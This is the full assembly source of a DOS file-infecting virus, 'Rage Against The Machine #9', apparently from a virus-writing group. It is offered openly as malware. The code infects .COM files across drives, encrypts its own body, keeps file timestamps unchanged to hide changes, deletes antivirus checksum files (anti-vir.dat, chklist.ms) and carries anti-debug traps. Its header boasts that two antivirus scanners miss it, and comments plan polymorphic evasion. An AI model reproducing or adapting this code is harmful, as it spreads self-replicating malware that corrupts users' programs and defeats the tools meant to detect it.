;
; Rage Against The Machine #9 - Saruman / DFR Viral Laboratories
;
; Specs: NON-RES .COM INFECTOR, ENCRYPTION, TIME/DATE PRESERVATION
;        ANTI-VIRUS CHECKSUM-FILE REMOVAL, DEBUG-TRAPS,
;        MULTI-DRIVE-CURRENT-DIR-ONLY INFECTION,
;
; Real nice version, neither TBAV or F-PROT with Heuristics says anything.
;
; To Do:
;  make sure it won't encrypt with zeroes? (one chance in 65K, worth it?)
;  implement fully polymorphic decryption (under development)
;  randseed/cryptkey generator
;  count infections and disinfect executing-host before passing controll.
;  save int21 to unused vectors - set flag. always use this alternative
;  int in the future if the flag is set. (gives a kind of tunneling).
;  generate wirte_virus and decrypter in VIDEOmem and copy to new hosts
;  sort of polymorphing.

.model tiny
.code
.radix 16

include fileattr.inc

VirusSize   equ  END_OF_VIRUS - MAIN
EntryOfs    equ  STARTCODE - MAIN - 3

SizeMIN     equ  2
SizeMAX     equ  065400d-VirusSize

            org 100

main:       jmp startcode
dummy       db 0                             ;jmp short<>jmp near (2 vs 3 bytes)

; set marker here? Or read virus body?

;db 0,0,0,0,0,0,0,0,0,0,0,0

write_virus:
            call endecrypt                   ;encrypt code
            xchg cx,si
            int 21h                          ;Write virus body
            call endecrypt                   ;decrypt code again
            ret
;                                             BEWARE! DESTROYS - di,cx,flags
endecrypt:
            mov di,offset encryption_start
            mov cx,(end_of_virus-encryption_start-2)/2
           cryptloop:
            db 81h,33h      ; xor word ptr[bp+di],
cryptkey:   db 0,0
            add di,2
           loop cryptloop
            ret

;db 0,0,0,0,0,0,0,0,0,0

;==========================================================================
; ** Virus Entry Point **
;==========================================================================
startcode:
            mov bx,0000h
            push bx
            pop bp
            call endecrypt

;==========================================================================
; The encrypted virus code starts here, first we play around a little
; and initialize some variables...
;==========================================================================
encryption_start:
 ;           mov ax,2500
 ;           lea dx,bp+newINT1
 ;           int 21h                           ;fool realmode debuggers.
 ;           inc ax
 ;           int 21h                           ;int 0 & int 1 hooked!

;            include no_msav.inc
            include no_deb01.inc

            mov di,100h                       ;Recreate header
            lea si,bp+orgheader
            cld
            movsw
            movsb

            mov ah,1ah
            lea dx,bp+dta
            int 21h                           ;Setup DTA area

            lea dx,bp+TBdriver
            call findfirst
            jc no_tbav_present
            jmp megaexit

no_tbav_present:

;==========================================================================
; Start the process of finding new hosts...
;==========================================================================
            mov ah,19h
            int 21
            mov byte ptr [bp+olddrive],al     ; store starting drive
            mov byte ptr [bp+drive],2         ; start on C:
NextDrive:
            inc byte ptr [bp+drive]
            mov dl,byte ptr [bp+drive]
            cmp dl,027d
            jne proceed
            jmp exit                          ; all done!
proceed:
            mov ah,36h
            int 21h                           ; get free space
            cmp ax,0ffffh
            je  nextdrive                     ; loop if NOT valid drive
           
            mov ah,64d
            add ah,byte ptr[bp+drive]
            lea si,bp+wildcard
            mov byte ptr [si],ah              ; fix 'X:*.COM'

            mov dx,si
            mov cx,anyfile-VolumeID-SysFile-Directory
            call findfirst
            jc nextdrive                      ;.. not found, next drive.

            mov dl,byte ptr [bp+drive]
            dec dl
            mov ah,0eh
            int 21h                           ;CD to the correct drive
checkit:
;KUK!
            cmp word ptr[bp+file_size],SizeMAX
            ja next_victim                   ;Too big?

            cmp word ptr[bp+file_size+2],0
            jne next_victim

            cmp word ptr[bp+file_size],SizeMIN
            jbe next_victim

            call process_victim               ;INFECT!

next_victim:
            mov ah,4fh
            int 21h                           ;Find Next
            jnc checkit                       ;Aha! Another host found..
            jmp nextdrive                     ;All done on this drive, next!


;==========================================================================
; This procedure will infect the file pointed to by the DTA.filename
;==========================================================================
process_victim:
            mov ax,4301
            lea dx,bp+filename
            mov cx,0
            int 21                           ;clear file-attributes
            jnz okidoki                      ;BEFORE OPEN! = IMPORTANT!
close_skip_file:
            jmp skip_file

okidoki:
            mov ax,3d02
            lea dx,bp+filename
            int 21                           ;Open file r/w

            mov BP+FILE,ax                   ;Save the file handle
            xchg ax,bx
            mov ah,3f
            mov cx,3
            lea dx,bp+ORGHEADER
            int 21                           ;Read first 3 bytes & store them

            cmp word ptr [bp+orgheader],'ZM' ;Check renamed EXE
            je close_skip_file

            mov ax,word ptr[bp+file_size]
            sub ax,VirusSize-EntryOFS
            cmp word ptr [bp+orgheader+1],ax
            je  skip_file

;==========================================================================
; Erase stupid checksum files.
;==========================================================================
            lea dx,bp+kill_tbav
            call kill_ds_dx
            lea dx,bp+kill_msav
            call kill_ds_dx

;=====================
; Do infect.
;=====================
            mov ax,5d53h
            cmp word ptr [bp+startcode+3],ax    ;cmp with push bx+pop bp
            jne set_header2
            mov ax,0eb8bh
set_header2:
            mov word ptr [bp+startcode+3],ax

            mov ax,word ptr [bp+file_size]   ;Calculate jmp-header
            mov word ptr [bp+startcode+1],ax ;fix MOV BP,<value> at start ...
          
            add ax,ENTRYOFS
            mov byte ptr [BP+BUF],0E9h       ; E9 = opcode for JMP
            mov word ptr [BP+BUF+1],ax       ; ax = filesize+offset into virus

            mov ax,4200
            xor cx,cx
            xor dx,dx
            int 21                           ;Seek to beginning of file
         
            mov ah,40
            mov cx,3
            lea dx,BP+BUF
            int 21                           ;Write JMP to header
;            jc  skip_file
            inc word ptr [bp+infected]

            mov ax,4202
            xor cx,cx
            xor dx,dx
            int 21                           ;Seek to end of file

            inc word ptr [bp+total_infected]
            inc byte ptr [bp+fixme]
            add word ptr [bp+cryptkey],0ffffh

;            call morph_endecrypt

            mov ah,40
            lea dx,bp+main
            mov bx,BP+FILE
            mov si,VirusSize
            call write_virus

skip_file:
            mov ax,5701
            mov bx,BP+FILE
            mov cx,word ptr [bp+file_time]
            mov dx,word ptr [bp+file_date]
            int 21                           ;Restore old datestamp

            mov ah,3e
            int 21                           ;Close file

            lea dx,bp+filename
            mov ax,4301
            xor ch,ch
            mov cl,byte ptr [bp+attribute]
            int 21                           ;Restore old attributes

            ret

;===========================================================================
; Sprinkle garbage instructions into write_virus and endecode
;===========================================================================
;morph_endecrypt:
; mov cx,byteOPtable-morph_table
; lea di,bp+write_virus
; lea si,bp+morph_table
;
; mov ax,word ptr [bp+cryptkey]
; mov word ptr [bp+seed],ax           ;VARF�R BUGGAR DET?!?!
;
;more_garbage:
;
; Code returns random number in AX, changes DX
;
; mov     ax,word ptr [bp+seed]
; mov     dx,25173d
; mul     dx
; add     ax,13849d
; mov     word ptr [bp+seed],ax
;
; xor ah,ah
; and al,111b                         ;ax = 0 to 7
; lea bx,bp+byteOPTable
; add bx,ax
; mov al,byte ptr [bx]                ;al = opcode
; xor bx,bx
; mov bl,byte ptr[si]                 ; bl = offset
; mov byte ptr [di+bx],al             ; skriv al = korrekt offset.
; inc si
; loop more_garbage
; ret

;===========================================================================
; Kill file whose name is pointed to by DS:DX
;===========================================================================
kill_ds_dx:
            xor cx, cx
            mov ax,4301h
            int 21                          ;Clean the file attribs
            jc damned
            mov ah,41h
            int 21                          ;delete file
damned:     ret


findfirst:                                   ;(dx=filename. Return Z flag)
            mov cx,anyfile-VolumeID-SysFile-Directory
            mov ah,4eh
            int 21h
            ret

;==========================================================================
; Virus Closedown code
;==========================================================================
exit:

            mov ah,0eh
            mov dl,byte ptr [bp+olddrive]
            int 21h                           ;cd back to starting drive
megaexit:
            mov ah,1ah                        ;ReSet DTA address ...
            mov dx,80h                        ;... to default DTA
            int 21h
            xor ax,ax                         ;Reset all regs
            mov bx,ax
            mov cx,ax
            mov dx,ax
            xor si,si
            mov di,ax
            mov sp,0FFFEh                     ;SP= 0
            mov bp,100h                       ;BP= 100h (RETurn addr)
            push bp
            xor bp,bp
            ret                               ;return to 100h

newINT1:
            db 0eah,0,0,0ffh,0ffh

orgheader   db 0cdh,020h,0                   ;terminate for 1:st generation
wildcard:   db 0,':*.!!!',0

kill_tbav   db 'anti-vir.dat', 0
kill_msav   db 'chklist.ms', 0
tbdriver    db 'TBFILXXX',0

;morph_table:
; db 003h,004h,005h,008h,009h,00ah,00dh,00eh,00fh
; db 013h,014h,015h,017h,018h,01ch,01dh,021h,022h
; db 027h,028h,029h,02dh,02eh,02fh,032h,033h,034h
;byteOPtable:    ;8 olika
; cld
; cmc
; clc
; stc
;; std
; aaa
; aas
; daa
; das

message     db 'Rage Against The Machine'

total_infected dw 0

END_OF_VIRUS:

include     dta.inc
buf         db ?,?,?
file        dw ?
drive       db ?
olddrive    db ?
infected    dw ?
seed:       dw ?

end     main
